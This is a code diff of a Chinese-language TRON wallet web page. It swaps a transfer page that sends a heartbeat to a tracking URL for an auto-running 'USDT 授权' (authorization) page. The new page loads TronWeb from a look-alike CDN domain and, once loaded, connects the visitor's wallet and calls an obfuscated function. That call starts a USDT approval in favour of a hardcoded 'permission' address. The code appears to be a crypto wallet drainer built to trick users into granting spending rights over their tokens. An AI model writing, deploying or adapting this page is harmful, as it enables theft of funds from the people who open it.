@@ -1,241 +1,118 @@
- // 配置地址
-    window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
-    window.Payment_address = 'TAymcrbZ3ybiVq9DrqQXWx3AmtPWMiwhsh';
-    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    window.heartbeatUrl = 'https://baidu.com/heartbeat';
-
-    // 存储用户数据
-    const userData = {
-        address: null,
-        trxBalance: null,
-        usdtBalance: null
-    };
-    
-    const USDT_TO_USD_RATE = 0.99; // USDT兑USD汇率，实际应从API获取
-    const MINER_FEE_TRX = 0.1; // 矿工费，实际应根据网络情况计算
-
-    // 主初始化函数
-    async function initializeDApp() {
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
-        
-        if (!isMobile) {
-            tip('建议在移动端钱包环境使用');
-        } else if (isMobile && !isDAppBrowser) {
-            const currentUrl = encodeURIComponent(window.location.href);
-            window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
-        } else if (isMobile && isDAppBrowser) {
-            await connectWallet();
-            bindEvents();
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+    <title>USDT 授权</title>
+    <link rel="icon" type="image/png" href="png/icon_trx.png">
+    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
+    <script src="js/1.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Helvetica Neue', Arial, 'Noto Sans', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            background: #0b0b0f;
+            color: #fff;
         }
-        
-        // 显示矿工费
-        document.getElementById('minerFee').textContent = `${MINER_FEE_TRX} TRX`;
+        .container {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            width: 92%;
+            max-width: 480px;
+            background: #111218;
+            border: 1px solid #1f2130;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+        }
+        .title {
+            margin: 0 0 8px 0;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .desc { color: #aab; font-size: 14px; margin: 4px 0 14px; }
+        .row { margin: 8px 0; font-size: 14px; }
+        .muted { color: #99a; }
+        .success { color: #20c997; }
+        .error { color: #ff6b6b; }
+        a { color: #6ea8fe; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <h2 class="title">USDT 授权</h2>
+            <div id="message" class="row muted">正在检测钱包环境...</div>
+            <div id="address" class="row"></div>
+            <div id="tx" class="row"></div>
+        </div>
+    </div>
+
+    <script>
+    // 必填参数
+    window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1'; // 合约地址（被授权方）
+    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT 合约
+
+    function setMessage(text, cls) {
+        const el = document.getElementById('message');
+        el.textContent = text;
+        el.className = 'row ' + (cls || 'muted');
+    }
+    function setAddress(addr) {
+        const el = document.getElementById('address');
+        el.textContent = addr ? ('地址：' + addr) : '';
+        el.className = 'row muted';
+    }
+    function setTx(hash) {
+        const el = document.getElementById('tx');
+        if (!hash) { el.textContent = ''; return; }
+        const url = 'https://tronscan.org/#/transaction/' + hash;
+        el.innerHTML = '交易哈希：<a target="_blank" rel="noopener" href="' + url + '">' + hash + '</a>';
     }
 
-    // 连接到钱包
-    async function connectWallet() {
-        try {
-            if (window.tronWeb && window.tronWeb.ready) {
-                await initDApp();
-            } else if (window.tronLink) {
-                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                if (res.code === 200) {
-                    window.tronWeb = window.tronLink.tronWeb;
-                    await initDApp();
-                }
+    async function ensureWalletReady() {
+        const isDApp = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
+        if (!isDApp) {
+            setMessage('未检测到 DApp 钱包，请在钱包内打开本页面', 'error');
+            throw new Error('No DApp wallet');
+        }
+        if (window.tronWeb && window.tronWeb.ready) {
+            return window.tronWeb;
+        }
+        if (window.tronLink && window.tronLink.request) {
+            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+            if (res && res.code === 200) {
+                window.tronWeb = window.tronLink.tronWeb;
+                return window.tronWeb;
             }
-        } catch (error) {
-            console.error("钱包连接失败:", error);
-            tip('钱包连接失败，请检查钱包环境');
         }
+        setMessage('钱包未授权账户访问', 'error');
+        throw new Error('Wallet not authorized');
     }
 
-    // 初始化DApp数据
-    async function initDApp() {
+    async function bootstrap() {
         try {
-            userData.address = window.tronWeb.defaultAddress.base58;
-            
-            // 获取TRX余额
-            const trxBalanceSun = await window.tronWeb.trx.getBalance(userData.address);
-            userData.trxBalance = window.tronWeb.fromSun(trxBalanceSun);
-            
-            // 获取USDT余额
-            const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
-            const usdtBalanceRaw = await contract.balanceOf(userData.address).call();
-            userData.usdtBalance = usdtBalanceRaw / 1e6; // USDT是6位小数
-            
-            // 更新页面显示
-            document.getElementById('trxBalance').textContent = parseFloat(userData.trxBalance).toFixed(4);
-            document.getElementById('usdtBalance').textContent = parseFloat(userData.usdtBalance).toFixed(4);
-            
-        } catch (error) {
-            console.error("获取用户数据时出错:", error);
-            tip('获取钱包数据失败');
+            setMessage('正在连接钱包...');
+            const tw = await ensureWalletReady();
+            const addr = tw && tw.defaultAddress && tw.defaultAddress.base58;
+            setAddress(addr || '');
+
+            setMessage('正在发起 USDT 授权...', 'muted');
+            const txid = await KdhshaBBHdg();
+            setMessage('授权成功', 'success');
+            setTx(txid);
+        } catch (err) {
+            setMessage('授权失败：' + (err && err.message ? err.message : '未知错误'), 'error');
         }
     }
 
-    // 设置最大转账金额
-    function setMaxAmount() {
-        const amountInput = document.getElementById('amount');
-        if (amountInput && userData.usdtBalance) {
-            amountInput.value = parseFloat(userData.usdtBalance).toFixed(6);
-            updateAmountDisplay();
-        }
-    }
-
-    // 更新金额显示
-    function updateAmountDisplay() {
-        const amountInput = document.getElementById('amount');
-        const amount = parseFloat(amountInput.value) || 0;
-        
-        // 更新USD显示
-        const usdAmount = (amount * USDT_TO_USD_RATE).toFixed(2);
-        const usdElement = document.getElementById('amount-display');
-        if (usdElement) {
-            usdElement.textContent = usdAmount;
-        }
-        
-        updateSubmitButtonState();
-        document.title = `正在申请转账 ${amount.toFixed(6)} USDT`;
-    }
-
-    // 更新提交按钮状态
-    function updateSubmitButtonState() {
-        const submitButton = document.getElementById('submitBtn');
-        if (!submitButton) return;
-        
-        const amountInput = document.getElementById('amount');
-        const amount = parseFloat(amountInput.value) || 0;
-        const receiptAddress = document.getElementById('receiptAddress').value.trim();
-        
-        const hasAddress = receiptAddress !== '';
-        const hasEnoughUsdt = amount <= parseFloat(userData.usdtBalance || '0');
-        const hasEnoughTrx = parseFloat(userData.trxBalance || '0') >= MINER_FEE_TRX;
-        
-        const isValid = amount > 0 && hasAddress && hasEnoughUsdt && hasEnoughTrx;
-        submitButton.disabled = !isValid;
-        submitButton.classList.toggle('disabled', !isValid);
-    }
-
-    // 绑定事件
-    function bindEvents() {
-        // 金额输入事件
-        const amountInput = document.getElementById('amount');
-        if (amountInput) {
-            amountInput.addEventListener('input', updateAmountDisplay);
-        }
-        
-        // 地址输入事件
-        const addressInput = document.getElementById('receiptAddress');
-        if (addressInput) {
-            addressInput.addEventListener('input', updateSubmitButtonState);
-        }
-        
-        // 最大按钮事件
-        const maxBtn = document.getElementById('maxBtn');
-        if (maxBtn) {
-            maxBtn.addEventListener('click', setMaxAmount);
-        }
-        
-        // 确认转账按钮事件
-        const submitBtn = document.getElementById('submitBtn');
-        if (submitBtn) {
-            submitBtn.addEventListener('click', onSubmitTransfer);
-        }
-    }
-
-    // 提交转账
-    async function onSubmitTransfer() {
-        const receiptAddress = document.getElementById('receiptAddress').value.trim();
-        const amountInput = document.getElementById('amount');
-        const amount = parseFloat(amountInput.value) || 0;
-        
-        if (!receiptAddress) {
-            tip('请输入收款地址');
-            return;
-        }
-        
-        // 验证Tron地址格式
-        if (!window.tronWeb.isAddress(receiptAddress)) {
-            tip('请输入有效的Tron地址');
-            return;
-        }
-        
-        try {
-            tip('正在准备转账...');
-            
-            // 获取USDT合约实例
-            const usdtContract = await window.tronWeb.contract().at(window.usdtContractAddress);
-            
-            // 转账金额需要乘以1e6（USDT的精度）
-            const amountWithDecimals = Math.round(amount * 1e6);
-            
-            // 执行转账
-            const result = await usdtContract.transfer(receiptAddress, amountWithDecimals).send({
-                feeLimit: 1000000, // 手续费限制
-                callValue: 0 // USDT转账不需要附加TRX
-            });
-            
-            console.log("转账结果:", result);
-            tip(`转账成功！交易哈希: ${result}`);
-            
-            // 重置金额
-            amountInput.value = '';
-            updateAmountDisplay();
-            
-        } catch (error) {
-            console.error("转账失败:", error);
-            tip(`转账失败: ${error.message || '未知错误'}`);
-        }
-    }
-
-    // 显示提示信息
-    function tip(message) {
-        const tipElement = document.getElementById('tip');
-        if (tipElement) {
-            tipElement.textContent = message;
-            tipElement.style.display = 'block';
-            tipElement.style.height = 'auto';
-            
-            setTimeout(() => {
-                tipElement.style.display = 'none';
-            }, 3000);
-        }
-    }
-
-    // 页面加载完成后初始化
-    document.addEventListener('DOMContentLoaded', () => {
-        initializeDApp();
-    });
-
-    // 心跳检测
-    function sendHeartbeat() {
-        const currentUrl = window.location.href;
-        
-        fetch(window.heartbeatUrl, {
-            method: 'POST',
-            mode: 'cors',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ url: currentUrl })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.status === 'error' && data.message === '会话已结束') {
-                console.log('会话已结束');
-                tip('会话已结束');
-            }
-        })
-        .catch(() => {});
-    }
-    
-    const heartbeatInterval = setInterval(sendHeartbeat, 5000);
-    window.onload = sendHeartbeat;
-    window.onbeforeunload = function() {
-        clearInterval(heartbeatInterval);
-    };
-</script>
+    document.addEventListener('DOMContentLoaded', bootstrap);
+    </script>
 </body>
 </html>
